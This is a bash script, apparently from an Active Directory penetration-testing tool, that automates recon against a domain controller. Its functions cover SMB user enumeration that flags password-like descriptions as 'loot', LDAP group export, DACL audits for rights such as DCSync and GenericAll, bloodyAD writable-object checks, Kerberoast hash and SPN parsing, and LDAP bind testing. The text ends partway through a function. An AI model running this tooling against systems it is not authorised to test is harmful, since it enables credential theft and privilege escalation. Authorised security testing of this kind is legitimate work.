    SSL_INFO=$(timeout 4 openssl s_client -connect "$HOST:$PORT" -showcerts 2>/dev/null)

    if [ -z "$SSL_INFO" ]; then
        warn "Could not retrieve SSL certificate from $HOST:$PORT"
        return
    fi

    # Extract SANs from the cert
    SAN=$(echo "$SSL_INFO" \
        | openssl x509 -noout -text 2>/dev/null \
        | awk '/X509v3 Subject Alternative Name/ {getline; print}' \
        | sed 's/DNS://g' \
        | tr ',' '\n' \
        | awk '{$1=$1};1')

    if [ -n "$SAN" ]; then
        info "Extracted Subject Alternative Names (SAN) from $HOST:$PORT:"
        echo "$SAN" | while read -r entry; do
            echo -e "    ${CYAN}- $entry${RESET}"
            echo "$entry" >> "$DISCOVERED_HOSTS"
        done
        
        if [ "$port" -eq 636 ]; then
            # Try to infer the base domain from SAN entries (e.g. scrm.local)
            DOMAIN_CONTROLLER=$(echo "$SAN" | grep -m1 -Eo '[a-zA-Z0-9.-]+\.[a-z]{2,}$')
            echo "$TARGET_IPV4 $DOMAIN_CONTROLLER" >> "$HOSTS_FILE"
            
            if [ -n "$DOMAIN_CONTROLLER" ]; then
               note "Detected Domain Controller from SAN: ${GREEN}$DOMAIN_CONTROLLER${RESET}"
               #echo "$DOMAIN_CONTROLLER" >> "$DISCOVERED_HOSTS"

               # If LDAP domain isn't already set, assign it
               #if [ -z "$LDAP_DOMAIN" ]; then
               #    LDAP_DOMAIN="$BASE_DOMAIN"
               #    note "LDAP domain set from SAN: ${GREEN}$LDAP_DOMAIN${RESET}"
            fi
        fi
    else
        warn "No Subject Alternative Name (SAN) entries found in certificate."
    fi
}

ensure_krb5_conf_from_ldap() {
    local DOMAIN="$1"      # e.g. scrm.local
    local DC_IP="$2"       # e.g. 10.129.3.54
    local DC_Host="$3"     # e.g. dc1.scrm.local
    local KRB5_FILE="/etc/krb5.conf"
    local REALM_UPPER
    REALM_UPPER=$(echo "$DOMAIN" | tr '[:lower:]' '[:upper:]')

    if [ -z "$DOMAIN" ] || [ -z "$DC_IP" ] || [ -z "$DC_Host" ]; then
        warn "Missing DOMAIN, DC_Host, or DC_IP for krb5.conf generation"
        return 1
    fi

    info "Validating krb5.conf for realm: ${REALM_UPPER}, ${DC_Host} | ${DC_IP}"

    # Check if krb5.conf already has the realm
    #if grep -qi "default_realm *= *$REALM_UPPER" "$KRB5_FILE" && \
    #   grep -q "^\s*$REALM_UPPER\s*=" "$KRB5_FILE"; then
    #    success "krb5.conf already configured for realm ${REALM_UPPER}"
    #    return 0
    #fi
    # Check if realm is already defined in krb5.conf
    if grep -qi "default_realm *= *$REALM_UPPER" "$KRB5_FILE" && \
       grep -q "^\s*$REALM_UPPER\s*=" "$KRB5_FILE"; then

        # Extract current KDC IP for this realm
        CURRENT_KDC=$(awk "/^\s*\[$REALM_UPPER\]/ {found=1} found && /kdc\s*=/ {gsub(/[ \t]*kdc[ \t]*=[ \t]*/, \"\", \$0); print; exit}" RS= "$KRB5_FILE")

        if [ "$CURRENT_KDC" = "$DC_IP" ]; then
            success "krb5.conf already configured correctly for realm ${REALM_UPPER} with KDC ${GREEN}$DC_IP${RESET}"
            return 0
        else
            notify "krb5.conf realm exists but KDC IP has changed: ${YELLOW}${CURRENT_KDC} → ${DC_IP}${RESET}"
        fi
    fi
    

    backup_file="${KRB5_FILE}.bak.$(date +%s)"
    sudo cp "$KRB5_FILE" "$backup_file"
    notify "Backed up existing krb5.conf to: $backup_file"

    # Replace krb5.conf with minimal working config
    echo
    critical "Generating krb5.conf for LDAP realm: ${REALM_UPPER}"

    sudo bash -c "cat > $KRB5_FILE" <<EOF
[libdefaults]
    default_realm = $REALM_UPPER
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
    rdns = false

[realms]
    $REALM_UPPER = {
        kdc = $DC_IP
        admin_server = $DC_Host
        default_domain = $DOMAIN
    }

[domain_realm]
    .$DOMAIN = $REALM_UPPER
    $DOMAIN = $REALM_UPPER
EOF

    success "krb5.conf generated for realm $REALM_UPPER with DC $DC_IP"
}

getnpusers_cmd() {
    if command -v impacket-GetNPUsers >/dev/null 2>&1; then
        echo "impacket-GetNPUsers"
    elif command -v GetNPUsers.py >/dev/null 2>&1; then
        echo "GetNPUsers.py"
    else
        return 1
    fi
}

cme_enum_users() {
    local AUTH_LABEL="$1"
    local CME_ARGS="$2"
    local FOUND_DESC=0

    command -v crackmapexec >/dev/null 2>&1 || return 1

    info "Enumerating SMB users via crackmapexec ($AUTH_LABEL)..."
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}crackmapexec smb $TARGET_IPV4 $CME_ARGS --users${RESET}"

    # Capture full CME output (stdout + stderr)
    RAW_CME=$(crackmapexec smb "$TARGET_IPV4" $CME_ARGS --users 2>&1)

    # --- 1. Hard failure: no auth at all ---
    if echo "$RAW_CME" | grep -qiE '\[-\].*(STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|ACCESS_DENIED)'; then
        warn "SMB authentication failed ($AUTH_LABEL)"
        return 1
    fi

    # --- 2. Auth success but enumeration explicitly denied ---
    if echo "$RAW_CME" | grep -qiE 'Error enumerating domain users|NTLM needs domain\\\\username'; then
        notify "SMB authentication successful ($AUTH_LABEL), but user enumeration is not permitted"
        SMB_AUTH_OK=true
        return 0
    fi

    # --- 3. Parse enumerated users ONLY ---
    OUTPUT=$(echo "$RAW_CME" | awk '
        /^[A-Z]+[[:space:]]+[0-9.]+/ {
            user=""
            desc=""

            for (i=1; i<=NF; i++) {
                if ($i ~ /\\/) {
                    split($i,a,"\\")
                    user=a[2]
                }
            }

            # Skip self-echo or empty results
            if (user == "" || tolower(user) == "guest") next

            # Capture description if present
            match($0, /desc:[[:space:]]*(.*)$/, d)
            if (d[1] != "") {
                desc=d[1]
            }

            if (user != "") {
                print user "|" desc
            }
        }
    ' | sort -u)

    # --- 4. No users parsed (but no explicit failure) ---
    if [[ -z "$OUTPUT" ]]; then
        notify "SMB authentication successful ($AUTH_LABEL), but no domain users were returned"
        return 0
    fi

    # --- 5. Enumeration succeeded ---
    high_risk "SMB user enumeration successful ($AUTH_LABEL)"
    SMB_AUTH_OK=true
    echo -e "    ${YELLOW}Users Discovered:${RESET}"

    while IFS="|" read -r user desc; do
        echo -e "      - ${BYELLOW}$user${RESET}"

        if [[ -n "$desc" ]]; then
            if echo "$desc" | grep -Ei 'pass|pwd|creds|password|secret|key|cont|contractor|temp' >/dev/null; then
                echo -e "          ${RED}⚠ Description:${RESET} $desc"
                echo -e "[LOOT] $TARGET_IPV4 SMB DESC $user : $desc" >> smb_user_descriptions.txt
                FOUND_DESC=1
            else
                echo -e "          ℹ Description: $desc"
            fi
        fi
    done <<< "$OUTPUT"

    # Save clean user list
    echo "$OUTPUT" | cut -d'|' -f1 > "users_smb_$TARGET_IPV4.txt"
    success "Saved user list to users_smb_$TARGET_IPV4.txt"

    if [ "$FOUND_DESC" -eq 1 ]; then
        success "Suspicious descriptions logged to smb_user_descriptions.txt"
    fi

    return 0
}

nxc_enum_users() {
    local AUTH_LABEL="$1"
    local NXC_ARGS="$2"
    local FOUND_DESC=0
    local RAW_OUT USERS

    command -v netexec >/dev/null 2>&1 || return 1

    info "Enumerating SMB users via netexec ($AUTH_LABEL)..."
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}netexec smb $TARGET_IPV4 $NXC_ARGS --users${RESET}"

    RAW_OUT=$(netexec smb "$TARGET_IPV4" $NXC_ARGS --users 2>&1)

    # --- 1. Hard authentication failure ---
    if echo "$RAW_OUT" | grep -qiE 'STATUS_LOGON_FAILURE|ACCESS_DENIED|KDC_ERR|LOGON_FAILURE'; then
        warn "SMB authentication failed ($AUTH_LABEL)"
        return 1
    fi

    # --- 2. Auth OK but enumeration not allowed ---
    if echo "$RAW_OUT" | grep -qiE 'Error enumerating|not permitted'; then
        notify "SMB authentication successful ($AUTH_LABEL), but user enumeration is restricted"
        SMB_AUTH_OK=true
        return 0
    fi
    
    if echo "$RAW_OUT" | grep -qP '\[\+\]'; then
        notify "SMB authentication successful ($AUTH_LABEL)"
    fi

    # --- 3. Parse users table (skip headers & footer) ---
    USERS=$(echo "$RAW_OUT" | awk '
        $1 == "SMB" && $5 !~ /^-Username-$/ && $6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}|<never>$/ {
            user=$5
            desc=""
            if (NF > 7) {
                for (i=8; i<=NF; i++) {
                    desc = desc $i " "
                }
            }
            gsub(/[[:space:]]+$/, "", desc)
            print user "|" desc
        }
    ' | sort -u)

    # --- 4. No users parsed ---
    if [[ -z "$USERS" ]]; then
        notify "SMB authentication successful ($AUTH_LABEL), but no users returned"
        return 0
    fi

    # --- 5. Enumeration succeeded ---
    high_risk "SMB user enumeration successful ($AUTH_LABEL)"
    SMB_AUTH_OK=true
    echo -e "    ${YELLOW}Users Discovered:${RESET}"

    while IFS="|" read -r user desc; do
        echo -e "      - ${BYELLOW}$user${RESET}"

        if [[ -n "$desc" ]]; then
            if echo "$desc" | grep -Ei 'pass|pwd|creds|password|secret|key|temp|contract' >/dev/null; then
                echo -e "          ${RED}⚠ Description:${RESET} $desc"
                echo "[LOOT] $TARGET_IPV4 SMB DESC $user : $desc" >> smb_user_descriptions.txt
                FOUND_DESC=1
            else
                echo -e "          ℹ Description: $desc"
            fi
        fi
    done <<< "$USERS"

    # --- 6. Save output ---
    echo "$USERS" | cut -d'|' -f1 > "users_smb_$TARGET_IPV4.txt"
    success "Saved user list to users_smb_$TARGET_IPV4.txt"

    if [[ "$FOUND_DESC" -eq 1 ]]; then
        success "Suspicious descriptions logged to smb_user_descriptions.txt"
    fi

    return 0
}

export_authenticated_user_groups() {
    local DATE_TAG USER_GROUPS_CSV USER_GROUPS_TXT RAW_GROUPS_FULL
    local BIND_DN

    if [[ "$LDAP_BIND_TYPE" != "auth" ]]; then
        info "Skipping authenticated user group export — no authenticated LDAP bind"
        return 0
    fi

    if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" || -z "${LDAP_DOMAIN:-}" || -z "${LDAP_BASE_DN:-}" ]]; then
        warn "Missing AUTH_USER / AUTH_PASS / LDAP_DOMAIN / LDAP_BASE_DN — skipping group export"
        return 1
    fi

    if ! command -v ldapsearch >/dev/null 2>&1; then
        warn "ldapsearch not found — skipping authenticated user group export"
        return 1
    fi

    BIND_DN="${AUTH_USER}@${LDAP_DOMAIN}"

    info "Exporting group membership for authenticated user: ${AUTH_USER}"
    note "LDAP bind DN: ${BIND_DN}"
    note "LDAP base DN: ${LDAP_BASE_DN}"

    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    USER_GROUPS_CSV="user_groups_${AUTH_USER}_${TARGET_IPV4}_${DATE_TAG}.csv"
    USER_GROUPS_TXT="user_groups_${AUTH_USER}_${TARGET_IPV4}_${DATE_TAG}.txt"

    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}ldapsearch -LLL -x -H ldap://$TARGET_IPV4 -D '$BIND_DN' -w '$AUTH_PASS' -b '$LDAP_BASE_DN' '(sAMAccountName=${AUTH_USER})' distinguishedName memberOf${RESET}"

    AUTH_USER_DN=$(
        ldapsearch -LLL -x \
            -H "ldap://$TARGET_IPV4" \
            -D "$BIND_DN" \
            -w "$AUTH_PASS" \
            -b "$LDAP_BASE_DN" \
            "(sAMAccountName=${AUTH_USER})" distinguishedName 2>/dev/null \
        | awk -F': ' '/^distinguishedName: / {print $2; exit}'
    )

    mapfile -t AUTH_USER_GROUP_DNS < <(
        ldapsearch -LLL -x \
            -H "ldap://$TARGET_IPV4" \
            -D "$BIND_DN" \
            -w "$AUTH_PASS" \
            -b "$LDAP_BASE_DN" \
            "(sAMAccountName=${AUTH_USER})" memberOf 2>/dev/null \
        | awk -F': ' '/^memberOf: / {print $2}' \
        | sort -u
    )

    AUTH_USER_GROUP_NAMES=()
    for group_dn in "${AUTH_USER_GROUP_DNS[@]}"; do
        group_name=$(echo "$group_dn" | sed -n 's/^CN=\([^,]*\).*/\1/p')
        [[ -n "$group_name" ]] && AUTH_USER_GROUP_NAMES+=("$group_name")
    done

    if [[ -z "$AUTH_USER_DN" ]]; then
        warn "Could not resolve DN for ${AUTH_USER} — skipping group export"
        return 1
    fi

    if [[ ${#AUTH_USER_GROUP_DNS[@]} -eq 0 ]]; then
        notify "No group memberships found for ${AUTH_USER}"
        return 0
    fi

    printf "%s\n" "${AUTH_USER_GROUP_NAMES[@]}" > "$USER_GROUPS_TXT"

    {
        echo "Username,UserDN,GroupName,GroupDN"
        for i in "${!AUTH_USER_GROUP_DNS[@]}"; do
            printf '"%s","%s","%s","%s"\n' \
                "$AUTH_USER" \
                "$AUTH_USER_DN" \
                "${AUTH_USER_GROUP_NAMES[$i]}" \
                "${AUTH_USER_GROUP_DNS[$i]}"
        done
    } > "$USER_GROUPS_CSV"

    success "Authenticated user DN: ${BLUE}$AUTH_USER_DN${RESET}"
    success "Authenticated user groups saved to TXT: ${BLUE}$USER_GROUPS_TXT${RESET}"
    success "Authenticated user groups saved to CSV: ${BLUE}$USER_GROUPS_CSV${RESET}"

    print_section "Groups for ${AUTH_USER} (first 25 shown):" "${AUTH_USER_GROUP_NAMES[@]:0:25}"
    echo
}

run_impacket_dacl_audit() {
    local DACL_TOOL=""
    local DATE_TAG OUT_DIR USER_DN BIND_DN
    local -a USER_GROUP_DNS=()
    local -a TARGETS=()
    local -a PRINCIPALS=()

    if command -v impacket-dacledit >/dev/null 2>&1; then
        DACL_TOOL="impacket-dacledit"
    elif command -v dacledit.py >/dev/null 2>&1; then
        DACL_TOOL="dacledit.py"
    else
        warn "impacket-dacledit / dacledit.py not found — skipping DACL audit"
        return 1
    fi

    if [[ "$LDAP_BIND_TYPE" != "auth" ]]; then
        info "Skipping DACL audit — authenticated LDAP bind required"
        return 0
    fi

    if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" || -z "${LDAP_DOMAIN:-}" || -z "${LDAP_BASE_DN:-}" ]]; then
        warn "Missing AUTH_USER / AUTH_PASS / LDAP_DOMAIN / LDAP_BASE_DN — skipping DACL audit"
        return 1
    fi

    if [[ "$DC_AUTH_OK" -ne 1 && -z "${DOMAIN_CONTROLLER:-}" ]]; then
        info "Skipping DACL audit — target does not appear to be a DC"
        return 0
    fi

    if ! command -v ldapsearch >/dev/null 2>&1; then
        warn "ldapsearch not found — skipping DACL audit"
        return 1
    fi

    BIND_DN="${AUTH_USER}@${LDAP_DOMAIN}"

    info "Resolving authenticated user DN and group DNs for DACL audit"

    if [[ -z "${AUTH_USER_DN:-}" ]]; then
        warn "AUTH_USER_DN is empty — run export_authenticated_user_groups first"
        return 1
    fi

    if [[ ${#AUTH_USER_GROUP_DNS[@]} -eq 0 ]]; then
        notify "No cached group DNs available for ${AUTH_USER}"
    fi

    mapfile -t USER_GROUP_DNS < <(
        ldapsearch -LLL -x \
            -H "ldap://$TARGET_IPV4" \
            -D "$BIND_DN" \
            -w "$AUTH_PASS" \
            -b "$LDAP_BASE_DN" \
            "(sAMAccountName=${AUTH_USER})" memberOf 2>/dev/null \
        | awk -F': ' '/^memberOf: / {print $2}' \
        | sort -u
    )

    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    OUT_DIR="dacledit_${TARGET_IPV4}_${DATE_TAG}"
    mkdir -p "$OUT_DIR"
    
    DACL_AUDIT_DIR="$OUT_DIR"
    DACL_INTERESTING_FILE="$OUT_DIR/interesting_aces.txt"
    : > "$DACL_INTERESTING_FILE"
    
    PRINCIPALS+=("$AUTH_USER_DN")
    if [[ ${#AUTH_USER_GROUP_DNS[@]} -gt 0 ]]; then
        PRINCIPALS+=("${AUTH_USER_GROUP_DNS[@]}")
    fi

    TARGETS+=(
        "$LDAP_BASE_DN"
        "CN=Users,$LDAP_BASE_DN"
        "OU=Domain Controllers,$LDAP_BASE_DN"
        "CN=Domain Admins,CN=Users,$LDAP_BASE_DN"
        "CN=Administrators,CN=Builtin,$LDAP_BASE_DN"
        "CN=Account Operators,CN=Builtin,$LDAP_BASE_DN"
        "CN=Server Operators,CN=Builtin,$LDAP_BASE_DN"
        "CN=Backup Operators,CN=Builtin,$LDAP_BASE_DN"
        "CN=Print Operators,CN=Builtin,$LDAP_BASE_DN"
        "$AUTH_USER_DN"
    )

    success "Starting read-only DACL audit with $DACL_TOOL"
    note "Output directory: $OUT_DIR"

    local principal_dn target_dn principal_name target_name outfile cmd_out
    for principal_dn in "${PRINCIPALS[@]}"; do
        principal_name=$(echo "$principal_dn" | sed -n 's/^CN=\([^,]*\).*/\1/p' | tr ' /' '__')
        [[ -z "$principal_name" ]] && principal_name="principal"

        for target_dn in "${TARGETS[@]}"; do
            target_name=$(echo "$target_dn" | sed -n 's/^CN=\([^,]*\).*/\1/p; s/^OU=\([^,]*\).*/\1/p; t; s/^DC=\([^,]*\).*/domain/p' | tr ' /' '__')
            [[ -z "$target_name" ]] && target_name="target"

            outfile="$OUT_DIR/${principal_name}__${target_name}.txt"

            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}$DACL_TOOL -action read -principal-dn '$principal_dn' -target-dn '$target_dn' -dc-ip '$TARGET_IPV4' '${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}'${RESET}"

            cmd_out=$(
                timeout 20 "$DACL_TOOL" \
                    -action read \
                    -principal-dn "$principal_dn" \
                    -target-dn "$target_dn" \
                    -dc-ip "$TARGET_IPV4" \
                    "${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" 2>&1
            )

            printf "%s\n" "$cmd_out" > "$outfile"

            if echo "$cmd_out" | grep -Eiq 'GenericAll|GenericWrite|WriteDACL|WriteOwner|AllExtendedRights|WriteMembers|ResetPassword|DCSync|FullControl|WriteProperty'; then
                high_risk "Interesting ACEs found: principal='${principal_dn}' target='${target_dn}'"
                echo "$cmd_out" \
  		| grep -Ei 'GenericAll|GenericWrite|WriteDACL|WriteOwner|AllExtendedRights|WriteMembers|ResetPassword|DCSync|FullControl|WriteProperty' \
  		| tee -a "$DACL_INTERESTING_FILE" \
  		| sed 's/^/ /'
            else
                info "No obvious high-value rights for principal='${principal_name}' on target='${target_name}'"
            fi
        done
    done
    
    if [[ -s "$DACL_INTERESTING_FILE" ]]; then
  	DACL_INTERESTING_COUNT=$(sort -u "$DACL_INTERESTING_FILE" | tee "$DACL_INTERESTING_FILE.tmp" | wc -l)
  	mv "$DACL_INTERESTING_FILE.tmp" "$DACL_INTERESTING_FILE"
    else
  	DACL_INTERESTING_COUNT=0
    fi
    
    success "DACL audit complete. Full output saved under: ${BLUE}$OUT_DIR${RESET}"

    echo
    info "Quick review command:"
    echo -e "   ${GREEN}grep -RniE 'GenericAll|GenericWrite|WriteDACL|WriteOwner|AllExtendedRights|WriteMembers|ResetPassword|DCSync|FullControl|WriteProperty' '$OUT_DIR'${RESET}"
    echo
}

run_bloodyad_writable_audit() {
    local date_tag
    local out_dir
    local output_file
    local dc_host
    local rc
    local -a bad_cmd

    if ! command -v bloodyad >/dev/null 2>&1; then
        warn "bloodyad not found — skipping directory-wide writable-object audit"
        lightbulb "Install with: sudo apt install bloodyad"
        return 1
    fi

    if [[ "$LDAP_BIND_TYPE" != "auth" ]]; then
        info "Skipping writable-object audit — authenticated LDAP required"
        return 0
    fi

    if [[ -z "${AUTH_USER:-}" ||
          -z "${LDAP_DOMAIN:-}" ||
          -z "${TARGET_IPV4:-}" ]]; then
        warn "Missing username, domain, or DC IP for writable-object audit"
        return 1
    fi

    dc_host="$(get_preferred_dc_host "$TARGET_IPV4")"

    date_tag="$(date +'%Y%m%d_%H%M%S')"
    out_dir="bloodyad_${TARGET_IPV4}_${date_tag}"
    output_file="${out_dir}/writable_detailed.txt"

    mkdir -p "$out_dir"

    #
    # Prefer an existing Kerberos ccache.
    #
    if [[ -n "${KRB5CCNAME:-}" ]] && klist -s >/dev/null 2>&1; then
        info "Using Kerberos ccache for bloodyAD"

        bad_cmd=(
            bloodyad
            -H "$dc_host"
            -i "$TARGET_IPV4"
            -d "$LDAP_DOMAIN"
            -u "$AUTH_USER"
            -k "ccache=$KRB5CCNAME"
        )
    else
        if [[ -z "${AUTH_PASS:-}" ]]; then
            warn "No usable Kerberos ccache or password available"
            return 1
        fi

        info "Using username/password authentication for bloodyAD"

        bad_cmd=(
            bloodyad
            -H "$dc_host"
            -i "$TARGET_IPV4"
            -d "$LDAP_DOMAIN"
            -u "$AUTH_USER"
            -p "$AUTH_PASS"
        )
    fi

    echo
    info "Running directory-wide effective writable-object audit"
    note "Deleted objects are intentionally included"
    note "Output directory: $out_dir"

    set +e
    if [[ "$ENABLE_BH_EXPORT" == "true" ]]; then
        "${bad_cmd[@]}" get writable \
            --detail \
            --bh \
            >"$output_file" 2>&1
    else
        "${bad_cmd[@]}" get writable \
            --detail \
            >"$output_file" 2>&1
    fi

    rc=${PIPESTATUS[0]}
    set -e
    
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}${bad_cmd[@]} get writable --detail ${RESET}"
    
    if [[ $rc -ne 0 ]]; then
        warn "bloodyad writable audit failed with exit code $rc"
        return "$rc"
    fi

    success "Writable-object audit saved to: ${BLUE}$output_file${RESET}"

    echo
    high_risk "High-signal writable-object results:"

    grep -Ei \
        'DACL: WRITE|permission: (WRITE|CREATE_CHILD)|Deleted Objects|\\0ADEL:|MicrosoftDNS|DomainDnsZones|ForestDnsZones|svc_deploy|Remote Management|Backup|Deploy' \
        "$output_file" \
        | sed 's/^/  /' \
        || info "No high-signal patterns matched the summary parser"

    echo
    info "Review all child-creation rights:"
    echo -e "  ${GREEN}grep -B2 -A8 -Ei 'CREATE_CHILD|create.*child' '$output_file'${RESET}"

    info "Review deleted-object rights:"
    echo -e "  ${GREEN}grep -B2 -A10 -Ei 'Deleted Objects|\\\\0ADEL:' '$output_file'${RESET}"

    info "Review sensitive writable attributes:"
    echo -e "  ${GREEN}grep -B2 -A10 -Ei 'servicePrincipalName|msDS-KeyCredentialLink|member|nTSecurityDescriptor|userAccountControl|scriptPath' '$output_file'${RESET}"

    return 0
}

detect_kerberos_clock_skew() {
    local command_output="${1:-}"

    if grep -qiE 'KRB_AP_ERR_SKEW|Clock skew too great' <<< "$command_output"; then
        echo
        warn "Kerberos authentication failed because of clock skew"
        note "Your system time differs too much from the domain controller"
        note "Target DC: ${TARGET_IPV4:-unknown}"

        echo -e "     ${YELLOW}$ICON_TIP Synchronize your clock with the domain controller:${RESET}"
        echo -e "        ${GREEN}sudo ntpdate -u ${TARGET_IPV4}${RESET}"
        echo
        echo -e "     ${YELLOW}$ICON_TIP Alternative using chrony:${RESET}"
        echo -e "        ${GREEN}sudo chronyd -q 'server ${TARGET_IPV4} iburst'${RESET}"
        echo
        note "After synchronizing, rerun the authenticated LDAP checks"

        return 0
    fi

    return 1
}

parse_getuserspns_output() {
    local enumeration_output="${1:-}"
    local preferred_spn=""

    [[ -n "$enumeration_output" ]] || return 1

    # Parse only table rows whose first column has SPN syntax. This excludes
    # Impacket banners, status messages, headers, and the dashed separator.
    mapfile -t SPN_LIST < <(
        printf '%s\n' "$enumeration_output" |
            awk '$1 ~ /^[[:alnum:]_.-]+\/[[:alnum:]_.-]+/ {print $1}' |
            sort -u
    )
    mapfile -t SPN_USER_LIST < <(
        printf '%s\n' "$enumeration_output" |
            awk '$1 ~ /^[[:alnum:]_.-]+\/[[:alnum:]_.-]+/ && $2 != "" {print $2}' |
            sort -u
    )

    [[ ${#SPN_LIST[@]} -gt 0 ]] || return 1

    KERBEROAST_TARGETS=("${SPN_LIST[@]}")

    # Prefer an SPN belonging to the account named in the captured hash. When
    # more than one exists, the sorted no-port form is selected first.
    if [[ -n "$KERBEROAST_USER" ]]; then
        preferred_spn=$(
            printf '%s\n' "$enumeration_output" |
                awk -v user="$KERBEROAST_USER" '
                    $1 ~ /^[[:alnum:]_.-]+\/[[:alnum:]_.-]+/ &&
                    tolower($2) == tolower(user) {print $1}
                ' | sort -u | head -n 1
        )
    fi
    SPN_NAME="${preferred_spn:-${SPN_LIST[0]}}"

    if [[ -z "$KERBEROAST_USER" ]]; then
        KERBEROAST_USER=$(
            printf '%s\n' "$enumeration_output" |
                awk -v spn="$SPN_NAME" '$1 == spn {print $2; exit}'
        )
    fi

    success "Authoritative Kerberoast SPN selected: ${SPN_NAME}"
    return 0
}

parse_kerberoast_metadata() {
    local hash_file="${1:-}"

    [[ -n "$hash_file" && -s "$hash_file" ]] || return 1
    grep -Fq "\$krb5tgs\$" "$hash_file" || return 1

    # Impacket stores both RC4 and AES hashes as dollar-delimited fields. The
    # username is field 4 and the SPN is field 6; depending on the encryption
    # type, either value can be wrapped in asterisks. Impacket also replaces
    # colons in SPNs with tildes for hashcat compatibility.
    KERBEROAST_USER=$(awk -F'$' '
        $2 == "krb5tgs" {
            value=$4
            sub(/^\*/, "", value)
            print value
            exit
        }
    ' "$hash_file")

    SPN_NAME=$(awk -F'$' '
        $2 == "krb5tgs" {
            value=$6
            sub(/^\*/, "", value)
            sub(/\*$/, "", value)
            gsub(/~/, ":", value)
            print value
            exit
        }
    ' "$hash_file")

    mapfile -t KERBEROAST_TARGETS < <(
        awk -F'$' '
            $2 == "krb5tgs" {
                value=$6
                sub(/^\*/, "", value)
                sub(/\*$/, "", value)
                gsub(/~/, ":", value)
                if (value != "") print value
            }
        ' "$hash_file" | sort -u
    )

    KERBEROAST_HASH_FOUND=true

    if [[ -z "$KERBEROAST_USER" || -z "$SPN_NAME" ]]; then
        warn "Kerberoast hash found, but username or SPN metadata could not be parsed from $hash_file"
        return 0
    fi

    success "Kerberoast metadata parsed: ${KERBEROAST_USER} -> ${SPN_NAME}"
    return 0
}

ldap_enum() {
    local USE_AUTH="$1"
    local PASSED_DOMAIN="${2:-}"

    # LDAP is noisy — do not kill parent script
    set +e

    ########################################
    # Tool Resolution (netexec → CME)
    ########################################
    if command -v netexec >/dev/null 2>&1; then
        LDAP_TOOL="netexec"
    elif command -v crackmapexec >/dev/null 2>&1; then
        LDAP_TOOL="crackmapexec"
    else
        warn "netexec / crackmapexec not found — skipping LDAP enumeration"
        lightbulb "Install with: pipx install netexec"
        set -e
        return
    fi

    ########################################
    # Helper: Pretty Section Output
    ########################################
    print_section() {
        local TITLE="$1"
        shift
        local ITEMS=("$@")
        [[ ${#ITEMS[@]} -eq 0 ]] && return

        success "$TITLE"
        for i in "${ITEMS[@]}"; do
            echo "      - $i"
        done
    }

    echo
    info "LDAP enumeration via $LDAP_TOOL"
    echo "    Passed Domain: $PASSED_DOMAIN"

    ########################################
    # 1. Domain Resolution
    ########################################
    if [[ -n "$PASSED_DOMAIN" ]]; then
        LDAP_DOMAIN="${PASSED_DOMAIN,,}"
    elif [[ -n "$AUTH_DOMAIN" ]]; then
        LDAP_DOMAIN="${AUTH_DOMAIN,,}"
    else
        warn "No domain provided — LDAP enumeration limited"
        set -e
        return
    fi

    LDAP_BASE_DN=$(echo "$LDAP_DOMAIN" | awk -F. '{
        for (i=1;i<=NF;i++)
            printf "DC=%s%s", toupper($i), (i<NF?",":"")
    }')

    success "LDAP domain identified: $LDAP_DOMAIN"
    note "Base DN: $LDAP_BASE_DN"
    echo "$TARGET_IPV4 $LDAP_DOMAIN" >> "$HOSTS_FILE"

    ########################################
    # 2. Bind Capability Detection (FIXED)
    ########################################
    if [[ "$USE_AUTH" != "auth" ]]; then
        info "Testing Anonymous LDAP bind"
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 --anonymous${RESET}"
        ANON_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" --anonymous 2>&1)

        if echo "$ANON_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
            LDAP_ANON_BIND=true
            success "Anonymous LDAP bind allowed"
        else
            warn "Anonymous LDAP bind denied"
        fi
    fi

    if [[ "$USE_AUTH" != "auth" ]]; then
        info "Testing Guest LDAP bind (${LDAP_DOMAIN}\\Guest)"
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 -d $LDAP_DOMAIN -u 'guest' -p ''${RESET}"
        #GUEST_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u guest -p "" 2>&1)
        GUEST_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u guest -p "" 2>&1 | tr -d '\000')

        if echo "$GUEST_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
            LDAP_GUEST_BIND=true
            success "Guest LDAP bind allowed"
        else
            warn "Guest LDAP bind denied"
        fi
    fi
    
    #VERBOSE DEBUG
    #echo "[DEBUG] NTLM_ENABLED='$NTLM_ENABLED'"
    #echo "[DEBUG] USE_AUTH='$USE_AUTH'"
    #echo "[DEBUG] CREDS_PROVIDED='$CREDS_PROVIDED'"
    if [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true && $NTLM_ENABLED == true ]]; then
        info "Testing Authenticated LDAP bind ($AUTH_USER|$AUTH_PASS)"
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 -d $LDAP_DOMAIN -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
        AUTH_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" 2>&1)

